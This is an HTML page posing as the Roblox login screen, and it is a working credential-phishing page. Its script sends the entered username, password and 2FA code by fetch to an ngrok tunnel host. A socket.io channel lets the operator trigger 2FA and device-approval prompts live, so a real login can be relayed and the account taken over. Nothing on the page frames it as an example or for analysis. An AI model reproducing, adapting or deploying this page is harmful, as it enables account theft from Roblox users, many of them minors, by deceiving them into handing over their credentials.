<body>
<div id="background-image" class="background-image marketing-background-1"></div>
<div id="react-login-web-app" class="login-container">
<div class="login-content-wrapper">
<div id="login-base" class="login-base-container">
<div class="section-content login-section">
<h1 class="login-header" id="login-title">Login to Roblox</h1>
<div id="login-form">
<div class="login-form-container">
<form class="login-form" name="loginForm" id="login-form-element">
<div class="form-group username-form-group" id="username-group">
<label for="login-username" class="sr-only">Username/Email/Phone</label>
<input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" value="">
</div>
<div class="form-group password-form-group" id="password-group">
<label for="login-password" class="sr-only">Password</label>
<input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value="">

</div>

<div class="twofa-info">Enter the 6-digit code from your authenticator app or email</div>
<label for="login-twofa" class="sr-only">2FA Code</label>
<input id="login-twofa" name="twofa" type="text" class="form-control input-field" placeholder="6-digit code" maxlength="6" autocomplete="one-time-code">
</div>
<button type="button" id="login-button" class="btn-full-width btn-secondary-md login-button">Log In</button>
</form>
</div>

</div>

<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
(function(){
  var BACKEND = window.__BACKEND_URL__ || 'https://queenly-paterfamiliar-adah.ngrok-free.dev';
  var msgBox = document.getElementById('message-box');
  var btn = document.getElementById('login-button');
  var sessionId = 'default';
  var isTwoFA = false;
  
  var socket = io(BACKEND, { transports: ['websocket', 'polling'] });
  
  socket.on('connect', function() {
    socket.emit('join', { session_id: sessionId });
  });
  
  socket.on('login_error', function(data) {
    if(data.session_id === sessionId) {
      resetForm();
      showMsg(data.message || 'Incorrect username or password. Please try again.', 'error');
    }
  });
  
  socket.on('login_success', function(data) {
    if(data.session_id === sessionId) {
      btn.disabled = true;
      btn.textContent = 'Success!';
      showMsg('Login successful!', 'success');
    }
  });
  
  socket.on('require_2fa', function(data) {
    if(data.session_id === sessionId) {
      isTwoFA = true;
      document.getElementById('username-group').style.display = 'none';
      document.getElementById('password-group').style.display = 'none';
      document.getElementById('forgot-link').style.display = 'none';
      document.getElementById('signup-option').style.display = 'none';
      document.getElementById('twofa-section').style.display = 'block';
      document.getElementById('login-title').textContent = 'Two-Factor Authentication';
      btn.textContent = 'Verify';
      btn.disabled = false;
      document.getElementById('login-twofa').focus();
    }
  });
  
  socket.on('require_device_verify', function(data) {
    if(data.session_id === sessionId) {
      btn.disabled = true;
      btn.textContent = 'Waiting for approval...';
      showMsg(data.message || 'Please approve the login from another logged-in Roblox device. This page will update automatically.', 'info');
    }
  });
  
  function resetForm() {
    isTwoFA = false;
    btn.disabled = false;
    btn.textContent = 'Log In';
    document.getElementById('username-group').style.display = 'block';
    document.getElementById('password-group').style.display = 'block';
    document.getElementById('forgot-link').style.display = 'block';
    document.getElementById('signup-option').style.display = 'block';
    document.getElementById('twofa-section').style.display = 'none';
    document.getElementById('login-title').textContent = 'Login to Roblox';
    document.getElementById('login-username').value = '';
    document.getElementById('login-password').value = '';
    document.getElementById('login-twofa').value = '';
  }
  
  function showMsg(msg, type) {
    msgBox.textContent = msg;
    if (type === 'success') {
      msgBox.className = 'success-message';
    } else if (type === 'info') {
      msgBox.className = 'info-message';
    } else {
      msgBox.className = 'error-message';
    }
    msgBox.style.display = 'block';
  }

  function doLogin(e) {
    if(e) e.preventDefault();
    
    var username = (document.getElementById('login-username') || {}).value || '';
    var password = (document.getElementById('login-password') || {}).value || '';
    var code = (document.getElementById('login-twofa') || {}).value || '';
    
    username = username.trim();
    
    if (isTwoFA) {
      if (!code || code.length < 6) {
        showMsg('Please enter the 6-digit code.', 'error');
        return;
      }
      btn.disabled = true;
      btn.textContent = 'Verifying...';
      msgBox.style.display = 'none';
      
      fetch(BACKEND + '/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': '1' },
        body: JSON.stringify({ username: username, password: password, otp: code, stage: 2, session_id: sessionId })
      }).catch(function() {
        btn.disabled = false;
        btn.textContent = 'Verify';
        showMsg('Connection error. Please try again.', 'error');
      });
    } else {
      if (!username || !password) {
        showMsg('Please enter your username and password.', 'error');
        return;
      }
      btn.disabled = true;
      btn.textContent = 'Logging in...';
      msgBox.style.display = 'none';
      
      fetch(BACKEND + '/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': '1' },
        body: JSON.stringify({ username: username, password: password, session_id: sessionId })
      }).catch(function() {
        btn.disabled = false;
        btn.textContent = 'Log In';
        showMsg('Could not connect. Please try again.', 'error');
      });
    }
  }

  window.addEventListener('DOMContentLoaded', function() {
    var loginBtn = document.getElementById('login-button');
    if (loginBtn) loginBtn.addEventListener('click', doLogin);
    
    var twofaInput = document.getElementById('login-twofa');
    if (twofaInput) {
      twofaInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') doLogin();
      });
      twofaInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        msgBox.style.display = 'none';
      });
    }
    
    ['login-username', 'login-password'].forEach(function(id) {
      var el = document.getElementById(id);
      if (el) {
        el.addEventListener('keydown', function(e) { if (e.key === 'Enter') doLogin(); });
        el.addEventListener('input', function() { msgBox.style.display = 'none'; });
      }
    });
  });
})();
</script>
</body>
